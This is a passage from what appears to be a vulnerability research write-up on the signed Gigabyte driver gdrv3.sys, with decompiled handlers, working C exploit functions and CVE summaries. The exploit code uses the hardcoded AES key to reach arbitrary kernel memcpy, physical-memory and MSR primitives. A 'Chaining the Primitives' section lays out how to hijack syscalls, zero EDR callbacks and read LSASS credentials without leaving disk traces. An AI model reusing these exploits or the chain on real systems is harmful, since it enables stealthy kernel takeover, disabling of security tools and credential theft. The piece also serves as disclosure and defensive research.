#### `0xC3502800`: Allocate Contiguous Physical Memory

**Auth: AES+checksum**

**Ghidra decompilation:**

```c
if ((param_3 == 0x24) && (param_2 == 0x10)) {
    // verify checksum at byte [0x23], then AES decrypt first 16 bytes
    lVar2 = MmAllocateContiguousMemory(size,      // decrypted value = desired size
                                        0xffffff); // max physical address: 16MB ceiling
    if (lVar2 != 0) {
        *local_f0 = lVar2;   // return kernel VA to caller
        *param_4 = 0x10;
    }
}
```

The decrypted 16 bytes contain a single field: the desired allocation size. The driver allocates physically contiguous memory in the low 16MB range and returns the kernel virtual address.

**Exploit code:**

```c
void DoAllocContiguous(HANDLE hDev)
{
    SIZE_T size;
    printf("Size to allocate (hex): 0x"); scanf_s("%llx", &size);

    // Plaintext is just the size value. BuildAesBuffer handles the rest.
    BYTE plaintext[16] = { 0 };
    memcpy(plaintext, &size, sizeof(SIZE_T));

    BYTE inBuf[0x24] = { 0 };
    BYTE outBuf[0x10] = { 0 };
    BuildAesBuffer(inBuf, 0x24, plaintext, 16);

    DWORD bytesReturned = 0;
    if (DeviceIoControl(hDev, 0xC3502800, inBuf, 0x24, outBuf, 0x10, &bytesReturned, NULL)) {
        PVOID physAddr = 0;
        memcpy(&physAddr, outBuf, sizeof(PVOID));
        printf("Physical address: %p\n", physAddr);
    }
}
```

**Verified output:**

```
Physical address: D06CA000
```

**Impact:** Combined with the physical write primitive, contiguous low-memory allocation lets an attacker stage payloads at predictable physical addresses, useful for DMA attacks or interacting with legacy hardware that requires low physical memory.

* * *

#### `0xC3502808`: Kernel memcpy (Ring 0)

**Auth: AES+checksum**

**Ghidra decompilation:**

```c
// FUN_140001e88
// Input: 0x34 bytes (same two-block layout as the MSR handler)
// Decrypted 32-byte plaintext:
//   [0-7]   destination kernel VA
//   [8-15]  source kernel VA
//   [16-19] byte count

if (uVar4 != 0) {
    lVar6 = lVar6 - (longlong)puVar5;  // compute src-dest offset
    uVar3 = (ulonglong)uVar4;
    do {
        *puVar5 = puVar5[lVar6];       // raw byte copy: dest[i] = src[i]
        puVar5 = puVar5 + 1;
        uVar3   = uVar3 - 1;
    } while (uVar3 != 0);
}
```

Copies between two arbitrary kernel virtual addresses. No bounds checking. Source, destination, and length all come from your decrypted input. The copy loop is raw and will write wherever you point it.

**Exploit code:**

```c
void DoKernelMemcpy(HANDLE hDev)
{
    PVOID dest, src;
    DWORD size;
    printf("Destination address (hex): 0x"); scanf_s("%llx", &dest);
    printf("Source address (hex): 0x");      scanf_s("%llx", &src);
    printf("Size (hex): 0x");                scanf_s("%lx",  &size);

    static const BYTE key[16] = "GIGABYTEPASSWORD";

    // 32-byte plaintext: dest, src, size
    BYTE inBuf[0x34] = { 0 };
    memcpy(inBuf,      &dest, 8);   // [0-7]   destination kernel VA
    memcpy(inBuf + 8,  &src,  8);   // [8-15]  source kernel VA
    memcpy(inBuf + 16, &size, 4);   // [16-19] byte count

    // Encrypt both 16-byte blocks, then append key and checksum
    AesEncryptBlock(inBuf,      key, key);
    AesEncryptBlock(inBuf + 16, key, key);

    memcpy(inBuf + 0x20, key, 16);
    BYTE sum = 0;
    for (int i = 0; i < 0x33; i++) sum += inBuf[i];
    inBuf[0x33] = ~sum;

    BYTE outBuf[0x10] = { 0 };
    DWORD bytesReturned = 0;
    DeviceIoControl(hDev, 0xC3502808, inBuf, 0x34, outBuf, 0x10, &bytesReturned, NULL);
}
```

**Impact:** The most flexible kernel write primitive. An attacker can:

- **Zero EDR callback tables:**`PsSetLoadImageNotifyRoutine`, `ObRegisterCallbacks`, and similar callbacks used by security products can be overwritten, blinding them entirely without terminating any process
- **Patch the SSDT:** redirect syscalls to attacker-controlled handlers
- **Disable PatchGuard:** overwrite kernel integrity verification structures before they trigger a bugcheck
- No disk artifacts. No surviving evidence after reboot.

* * *

#### `0xC350280C`: Virtual to Physical Address Translation

**Auth: AES+checksum**

**Ghidra decompilation:**

```c
uVar1 = *(undefined8 *)local_f8;      // decrypted virtual address from input
uVar3 = MmGetPhysicalAddress(uVar1);  // translate VA to PA
*local_f0 = (int)uVar3;              // NOTE: driver returns only lower 32 bits
*param_4 = 4;
```

Takes any kernel or user virtual address, returns the corresponding physical address. Note: the driver truncates to 32 bits, so addresses above 4GB will not be returned correctly.

**Exploit code:**

```c
void DoVirtToPhys(HANDLE hDev)
{
    PVOID virtAddr;
    printf("Virtual address (hex): 0x"); scanf_s("%llx", &virtAddr);

    BYTE plaintext[16] = { 0 };
    memcpy(plaintext, &virtAddr, sizeof(PVOID));

    BYTE inBuf[0x24] = { 0 };
    BYTE outBuf[4]   = { 0 };
    BuildAesBuffer(inBuf, 0x24, plaintext, 16);

    DWORD bytesReturned = 0;
    if (DeviceIoControl(hDev, 0xC350280C, inBuf, 0x24, outBuf, 4, &bytesReturned, NULL)) {
        DWORD physAddr = 0;
        memcpy(&physAddr, outBuf, 4);
        printf("Physical address: 0x%08X\n", physAddr);
    }
}
```

**Impact:** The bridge between the virtual and physical worlds. An attacker who knows a kernel symbol (an EPROCESS pointer, a loaded module base, an EDR callback table address) translates it here and then uses `0xC3502000` or `0xC3502014` to read or write it directly, bypassing all virtual memory protections.

* * *

## Chaining the Primitives

Four IOCTL calls. Complete kernel takeover.

| Step | IOCTL | What it does |
| --- | --- | --- |
| 1 | `0xC3502580` (MSR read) | Read LSTAR (`0xC0000081`) to note the current syscall handler |
| 2 | `0xC3502580` (MSR write) | Write a controlled value to LSTAR to redirect every syscall on the system to your code |
| 3 | `0xC3502808` (kernel memcpy) | Zero EDR callback tables so security products stop receiving notifications |
| 4 | `0xC3502000` (physical read) | Read LSASS physical memory for credential extraction with no `OpenProcess`, no handle, no EDR hook |

None of these steps write to disk. The only evidence is in RAM and is gone on the next reboot.

Think about what that means from an attacker's perspective. A nation state operator or ransomware crew with local admin on a single machine can load this driver, blind every security product on the host, harvest credentials from LSASS with no detectable access pattern, and use those credentials to move laterally across the network. The EDR is still running the entire time. It just cannot see anything. No alerts fire, no analyst gets paged, and when the machine reboots the kernel patches are gone leaving almost nothing for forensics to recover.

This is exactly the playbook that groups like **Lazarus** (North Korea) and **BlackByte** ransomware have used against real targets. Lazarus has used BYOVD techniques in long-term espionage campaigns to maintain persistent, undetected access inside victim networks for months. BlackByte has used it specifically to kill EDR products before deploying ransomware payloads, ensuring encryption runs without interference. In both cases the signed driver is the key that opens the door: it is trusted by Windows, it loads without complaint, and once it is running the attacker is operating from a position the OS itself cannot challenge.

The primitives in `gdrv3.sys` are particularly well suited to this kind of operation. The LSTAR overwrite gives you a persistent kernel hook that survives process restarts. The kernel memcpy primitive lets you patch callback tables without touching the disk or spawning a new process. The physical memory read bypasses every userland protection on LSASS without generating a single handle audit event. And because the driver is legitimately signed, it passes application control checks and driver allowlists that would block anything you wrote yourself.

* * *

## Conclusion

This was a fun project from start to finish. What started as poking around a Gigabyte driver turned into a full reversal of 13 kernel primitives, a working exploit client, and five CVEs. The methodology here is repeatable: find a signed driver with dangerous imports, locate the dispatch function, enumerate the handlers, and ask what each one lets you do. You do not need to find something exotic. Consumer hardware software is full of drivers that were written to get a product shipped, not to be hardened against an attacker who is curious and has a copy of Ghidra.

I have included the driver and my IOCTL client tool on my GitHub for reference. Go find your own.

### CVE

Working through the findings, I identified five distinct vulnerabilities worth pursuing separately.

**CVE-1: Arbitrary Physical Memory Read/Write (Unauthenticated)** Criticality: High Class: CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer) IOCTLs `0xC3502000` and `0xC3502014` expose arbitrary physical memory read and write to any process that can open the device handle. No authentication, no checksum, no crypto knowledge required. A caller supplies a physical address and byte count and the driver acts on it immediately. Combined, these two primitives give an attacker complete read/write access to all physical memory on the system.

**CVE-2: Arbitrary Kernel Memory Write via Unauthenticated Physical Memory Mapping**
Criticality: High
Class: CWE-284 (Improper Access Control)
IOCTLs `0xC350200C` and `0xC3502010` provide a second independent unauthenticated path to physical memory via `\Device\PhysicalMemory`. The driver maps a caller-supplied physical range directly into the calling process's user-mode address space with no authentication. The existence of two separate unauthenticated physical memory access paths suggests the attack surface was never reviewed during development.

**CVE-3: Arbitrary MSR Read/Write** Criticality: Critical
Class: CWE-749 (Exposed Dangerous Method or Function)
IOCTL `0xC3502580` exposes direct `RDMSR`/`WRMSR` access to any caller who can supply a valid AES+checksum buffer. Because the key is hardcoded and extractable (see CVE-5), authentication provides no real barrier. Writing to LSTAR (`0xC0000081`) redirects every syscall on the system to attacker-controlled code. Writing to the SYSENTER MSRs (`0x174` through `0x176`) achieves the same on 32-bit paths. This is a complete kernel takeover in a single IOCTL call.

**CVE-4: Arbitrary Kernel Memory Copy (Ring 0)** Criticality: High
Class: CWE-123 (Write-what-where Condition)
IOCTL `0xC3502808` performs a raw kernel memcpy between two arbitrary virtual addresses with no bounds checking. Source, destination, and length are fully attacker-controlled. An attacker can use this to overwrite EDR callback tables, patch the SSDT, or modify any kernel data structure with no disk artifacts and no surviving evidence after reboot.

**CVE-5: Hardcoded Cryptographic Key** Criticality: High
Class: CWE-321 (Use of Hard-coded Cryptographic Key)
The AES-128 key used to authenticate nine of the thirteen IOCTLs is hardcoded in the driver binary as the plain string `GIGABYTEPASSWORD`. It is extractable with a string search in under a minute. The key is identical on every installation, cannot be rotated, and its exposure permanently compromises the authentication scheme on every machine running the driver.

_CVE assignments pending. Vendor has been notified prior to publication._